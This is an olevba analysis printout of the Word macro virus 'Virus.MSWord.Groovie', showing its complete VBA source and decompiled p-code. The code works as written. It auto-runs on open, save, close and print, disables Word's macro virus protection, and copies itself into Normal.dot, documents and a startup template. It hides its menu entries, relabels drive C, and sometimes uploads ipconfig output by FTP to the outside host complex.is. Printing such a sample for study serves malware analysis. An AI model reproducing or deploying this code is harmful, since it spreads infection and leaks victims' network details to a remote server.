olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WhoAmI As String
Public DataDot As Boolean
Public NormInstalled As Boolean
Public DocInstalled As Boolean
Public NormReadOnly As Boolean
Public HoldDoc As String
Public DocThere As Boolean
Public Final_Close_Called As Boolean
Function ID_Status()
On Error Resume Next
    If MacroContainer = NormalTemplate Then
        WhoAmI = "normal"
        GoTo checkout
    End If
    If MacroContainer = ActiveDocument Then WhoAmI = "document"
    If MacroContainer = "data.dot" Then WhoAmI = "orbit"
checkout:
End Function
Function Install_Status()
On Error Resume Next
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then DataDot = True
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "groovie" Then DocInstalled = True
    Next I
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(I).Name = "groovie" Then NormInstalled = True
    Next I
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or _
    GetAttr(NormalTemplate.FullName) = vbReadOnly Then NormReadOnly = True
End Function
Function The_Groovie_Core()
On Error Resume Next
Call ID_Status
Call Install_Status
    If WhoAmI = "document" Then Call DocCodeCore
    If WhoAmI = "normal" Then Call NormCodeCore
    If WhoAmI = "orbit" Then Call OrbitCoreCode
    If NormReadOnly = False Then CommandBars("tools").Controls("Macro").Delete
    If NormReadOnly = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
End Function
Function DocCodeCore()
On Error Resume Next
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
    If NormInstalled = False And NormReadOnly = False Then
        With NormalTemplate.VBProject
        With .VBComponents.Import("c:\groovie.sys")
        End With
        End With
    End If
    If DataDot = False Then
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        If Final_Close_Called = False Then Documents.Open FileName:=HoldDoc
        Shell ("label c: groovie"), 0
        Windows(1).Close
    End If
End Function
Function NormCodeCore()
On Error Resume Next
Application.ScreenUpdating = False
    Call Check_For_Doc
    If DocInstalled = False And DocThere = True Then
        With ActiveDocument.VBProject
        With .VBComponents.Import("c:\groovie.sys")
        End With
        End With
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "ALT-F11 says it's groovie!"
            .Execute
        End With
    End If
    If DataDot = False And DocThere = True Then
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If Final_Close_Called = False Then Documents.Open FileName:=HoldDoc
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
    If DataDot = False And DocThere = False Then
        Documents.Add Template:="", NewTemplate:=False
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
Application.ScreenUpdating = True
End Function
Function OrbitCoreCode()
On Error Resume Next
Application.ScreenUpdating = False
        If NormInstalled = False And NormReadOnly = False Then
            With NormalTemplate.VBProject
            With .VBComponents.Import("c:\groovie.sys")
            End With
            End With
            NormalTemplate.Save
        End If
        If DocInstalled = False Then
            With ActiveDocument.VBProject
            With .VBComponents.Import("c:\groovie.sys")
            End With
            End With
            With Dialogs(wdDialogFileSummaryInfo)
                .Comments = "ALT-F11 says it's groovie!"
                .Execute
            End With
        End If
Application.ScreenUpdating = True
End Function
Function Groovie_Run()
On Error Resume Next
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    HoldDoc = ActiveDocument.FullName
    Call The_Groovie_Core
    Randomize
    rn = Int(Rnd * 5)
    If rn = 3 Then Call IP_Love_You
End Function
Sub AutoOpen()
On Error Resume Next
Call Groovie_Run
End Sub
Sub AutoClose()
On Error Resume Next
Final_Close_Called = True
Call Groovie_Run
End Sub
Sub AutoExit()
On Error Resume Next
Final_Close_Called = True
Call Groovie_Run
End Sub
Sub FileSaveAs()
On Error Resume Next
Call Groovie_Run
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub filesave()
On Error Resume Next
Call Groovie_Run
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Sub fileclose()
On Error Resume Next
Final_Close_Called = True
Call Groovie_Run
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
ActiveDocument.Close
End Sub
Sub fileprint()
On Error Resume Next
Call Groovie_Run
Dialogs(wdDialogFilePrint).Show
End Sub
Function IP_Love_You()
On Error Resume Next
    Shell ("ipconfig /all /batch c:\ip.txt"), 0
    Call mscript("c:\script.sys")
    Shell ("ftp -s:c:\script.sys complex.is"), 0
End Function
Function mscript(strFile As String)
Randomize
On Error Resume Next
    one = Application.UserName
    two = Application.UserInitials
    rn = Int(Rnd * 999)
    Dim hFile As Long
    hFile = FreeFile
Open strFile For Output Access Write As hFile
    Print #hFile, "anonymous"
    Print #hFile, one & "@" & two & ".com"
    Print #hFile, "cd incoming"
    Print #hFile, "send"
    Print #hFile, "c:\ip.txt"
    Print #hFile, rn + rn & "." & two
    Print #hFile, "quit"
Close hFile
End Function
Sub viewvbcode()
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Function Check_For_Doc()
On Error GoTo docek
    If ActiveDocument.Name <> "" Then
        DocThere = True
    End If
    GoTo over
docek:
    DocThere = False
over:
End Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Groovie
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/groovie - 12062 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn WhoAmI (As String)
' Line #1:
' 	Dim (Public) 
' 	VarDefn DataDot (As Boolean)
' Line #2:
' 	Dim (Public) 
' 	VarDefn NormInstalled (As Boolean)
' Line #3:
' 	Dim (Public) 
' 	VarDefn DocInstalled (As Boolean)
' Line #4:
' 	Dim (Public) 
' 	VarDefn NormReadOnly (As Boolean)
' Line #5:
' 	Dim (Public) 
' 	VarDefn HoldDoc (As String)
' Line #6:
' 	Dim (Public) 
' 	VarDefn DocThere (As Boolean)
' Line #7:
' 	Dim (Public) 
' 	VarDefn Final_Close_Called (As Boolean)
' Line #8:
' 	FuncDefn (Function ID_Status())
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	LitStr 0x0006 "normal"
' 	St WhoAmI 
' Line #12:
' 	GoTo checkout 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "document"
' 	St WhoAmI 
' 	EndIf 
' Line #15:
' 	Ld MacroContainer 
' 	LitStr 0x0008 "data.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "orbit"
' 	St WhoAmI 
' 	EndIf 
' Line #16:
' 	Label checkout 
' Line #17:
' 	EndFunc 
' Line #18:
' 	FuncDefn (Function Install_Status())
' Line #19:
' 	OnError (Resume Next) 
' Line #20:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0008 "data.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DataDot 
' 	EndIf 
' Line #21:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #22:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "groovie"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DocInstalled 
' 	EndIf 
' Line #23:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #24:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #25:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "groovie"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstalled 
' 	EndIf 
' Line #26:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	LineCont 0x0004 0C 00 04 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbArchive 
' 	Ld vbReadOnly 
' 	Add 
' 	Eq 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormReadOnly 
' 	EndIf 
' Line #28:
' 	EndFunc 
' Line #29:
' 	FuncDefn (Function The_Groovie_Core())
' Line #30:
' 	OnError (Resume Next) 
' Line #31:
' 	ArgsCall (Call) ID_Status 0x0000 
' Line #32:
' 	ArgsCall (Call) Install_Status 0x0000 
' Line #33:
' 	Ld WhoAmI 
' 	LitStr 0x0008 "document"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) DocCodeCore 0x0000 
' 	EndIf 
' Line #34:
' 	Ld WhoAmI 
' 	LitStr 0x0006 "normal"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) NormCodeCore 0x0000 
' 	EndIf 
' Line #35:
' 	Ld WhoAmI 
' 	LitStr 0x0005 "orbit"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) OrbitCoreCode 0x0000 
' 	EndIf 
' Line #36:
' 	Ld NormReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #37:
' 	Ld NormReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #38:
' 	EndFunc 
' Line #39:
' 	FuncDefn (Function DocCodeCore())
' Line #40:
' 	OnError (Resume Next) 
' Line #41:
' 	LitStr 0x000E "c:\groovie.sys"
' 	LitStr 0x0007 "groovie"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #42:
' 	Ld NormInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NormReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #43:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	With 
' Line #44:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\groovie.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #45:
' 	EndWith 
' Line #46:
' 	EndWith 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld DataDot 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #49:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #50:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed Source 
' 	LitStr 0x0007 "groovie"
' 	ParamNamed New 
' 	LitStr 0x0005 "orbit"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #51:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #52:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #53:
' 	Ld Final_Close_Called 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld HoldDoc 
' 	ParamNamed FileName 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' 	EndIf 
' Line #54:
' 	LitStr 0x0010 "label c: groovie"
' 	Paren 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #55:
' 	LitDI2 0x0001 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndFunc 
' Line #58:
' 	FuncDefn (Function NormCodeCore())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #61:
' 	ArgsCall (Call) Check_For_Doc 0x0000 
' Line #62:
' 	Ld DocInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld DocThere 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #63:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	With 
' Line #64:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\groovie.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #65:
' 	EndWith 
' Line #66:
' 	EndWith 
' Line #67:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #68:
' 	LitStr 0x001A "ALT-F11 says it's groovie!"
' 	MemStWith Comments 
' Line #69:
' 	ArgsMemCallWith Execute 0x0000 
' Line #70:
' 	EndWith 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	Ld DataDot 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld DocThere 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #73:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #74:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed Source 
' 	LitStr 0x0007 "groovie"
' 	ParamNamed New 
' 	LitStr 0x0005 "orbit"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #75:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #76:
' 	Ld Final_Close_Called 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld HoldDoc 
' 	ParamNamed FileName 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' 	EndIf 
' Line #77:
' 	Ld wdSaveChanges 
' 	ParamNamed SaveChanges 
' 	LitDI2 0x0001 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	Ld DataDot 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld DocThere 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #80:
' 	LitStr 0x0000 ""
' 	ParamNamed Template 
' 	LitVarSpecial (False)
' 	ParamNamed NewTemplate 
' 	Ld Documents 
' 	ArgsMemCall Add 0x0002 
' Line #81:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #82:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed Source 
' 	LitStr 0x0007 "groovie"
' 	ParamNamed New 
' 	LitStr 0x0005 "orbit"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #83:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #84:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #85:
' 	Ld wdSaveChanges 
' 	ParamNamed SaveChanges 
' 	LitDI2 0x0001 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #88:
' 	EndFunc 
' Line #89:
' 	FuncDefn (Function OrbitCoreCode())
' Line #90:
' 	OnError (Resume Next) 
' Line #91:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #92:
' 	Ld NormInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NormReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #93:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	With 
' Line #94:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\groovie.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #95:
' 	EndWith 
' Line #96:
' 	EndWith 
' Line #97:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	Ld DocInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #100:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	With 
' Line #101:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\groovie.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #102:
' 	EndWith 
' Line #103:
' 	EndWith 
' Line #104:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #105:
' 	LitStr 0x001A "ALT-F11 says it's groovie!"
' 	MemStWith Comments 
' Line #106:
' 	ArgsMemCallWith Execute 0x0000 
' Line #107:
' 	EndWith 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #110:
' 	EndFunc 
' Line #111:
' 	FuncDefn (Function Groovie_Run())
' Line #112:
' 	OnError (Resume Next) 
' Line #113:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #114:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #115:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #116:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St HoldDoc 
' Line #117:
' 	ArgsCall (Call) The_Groovie_Core 0x0000 
' Line #118:
' 	ArgsCall Read 0x0000 
' Line #119:
' 	Ld Rnd 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	St rn 
' Line #120:
' 	Ld rn 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) IP_Love_You 0x0000 
' 	EndIf 
' Line #121:
' 	EndFunc 
' Line #122:
' 	FuncDefn (Sub AutoOpen())
' Line #123:
' 	OnError (Resume Next) 
' Line #124:
' 	ArgsCall (Call) Groovie_Run 0x0000 
' Line #125:
' 	EndSub 
' Line #126:
' 	FuncDefn (Sub AutoClose())
' Line #127:
' 	OnError (Resume Next) 
' Line #128:
' 	LitVarSpecial (True)
' 	St Final_Close_Called 
' Line #129:
' 	ArgsCall (Call) Groovie_Run 0x0000 
' Line #130:
' 	EndSub 
' Line #131:
' 	FuncDefn (Sub AutoExit())
' Line #132:
' 	OnError (Resume Next) 
' Line #133:
' 	LitVarSpecial (True)
' 	St Final_Close_Called 
' Line #134:
' 	ArgsCall (Call) Groovie_Run 0x0000 
' Line #135:
' 	EndSub 
' Line #136:
' 	FuncDefn (Sub FileSaveAs())
' Line #137:
' 	OnError (Resume Next) 
' Line #138:
' 	ArgsCall (Call) Groovie_Run 0x0000 
' Line #139:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #140:
' 	EndSub 
' Line #141:
' 	FuncDefn (Sub filesave())
' Line #142:
' 	OnError (Resume Next) 
' Line #143:
' 	ArgsCall (Call) Groovie_Run 0x0000 
' Line #144:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #145:
' 	EndSub 
' Line #146:
' 	FuncDefn (Sub fileclose())
' Line #147:
' 	OnError (Resume Next) 
' Line #148:
' 	LitVarSpecial (True)
' 	St Final_Close_Called 
' Line #149:
' 	ArgsCall (Call) Groovie_Run 0x0000 
' Line #150:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #151:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #152:
' 	EndSub 
' Line #153:
' 	FuncDefn (Sub fileprint())
' Line #154:
' 	OnError (Resume Next) 
' Line #155:
' 	ArgsCall (Call) Groovie_Run 0x0000 
' Line #156:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #157:
' 	EndSub 
' Line #158:
' 	FuncDefn (Function IP_Love_You())
' Line #159:
' 	OnError (Resume Next) 
' Line #160:
' 	LitStr 0x001E "ipconfig /all /batch c:\ip.txt"
' 	Paren 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #161:
' 	LitStr 0x000D "c:\script.sys"
' 	ArgsCall (Call) mscript 0x0001 
' Line #162:
' 	LitStr 0x001F "ftp -s:c:\script.sys complex.is"
' 	Paren 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #163:
' 	EndFunc 
' Line #164:
' 	FuncDefn (Function mscript(strFile As String))
' Line #165:
' 	ArgsCall Read 0x0000 
' Line #166:
' 	OnError (Resume Next) 
' Line #167:
' 	Ld Application 
' 	MemLd UserName 
' 	St one 
' Line #168:
' 	Ld Application 
' 	MemLd UserInitials 
' 	St two 
' Line #169:
' 	Ld Rnd 
' 	LitDI2 0x03E7 
' 	Mul 
' 	FnInt 
' 	St rn 
' Line #170:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #171:
' 	Ld Friend 
' 	St hFile 
' Line #172:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #173:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "anonymous"
' 	PrintItemNL 
' Line #174:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld one 
' 	LitStr 0x0001 "@"
' 	Concat 
' 	Ld two 
' 	Concat 
' 	LitStr 0x0004 ".com"
' 	Concat 
' 	PrintItemNL 
' Line #175:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #176:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "send"
' 	PrintItemNL 
' Line #177:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "c:\ip.txt"
' 	PrintItemNL 
' Line #178:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld rn 
' 	Ld rn 
' 	Add 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld two 
' 	Concat 
' 	PrintItemNL 
' Line #179:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #180:
' 	Ld hFile 
' 	Close 0x0001 
' Line #181:
' 	EndFunc 
' Line #182:
' 	FuncDefn (Sub viewvbcode())
' Line #183:
' 	LitStr 0x000C "It's GROOVIE"
' 	Ld vbOKOnly 
' 	LitStr 0x0015 "•  ALT-F11  • says..."
' 	ArgsCall MsgBox 0x0003 
' Line #184:
' 	EndSub 
' Line #185:
' 	FuncDefn (Sub ToolsMacro())
' Line #186:
' 	EndSub 
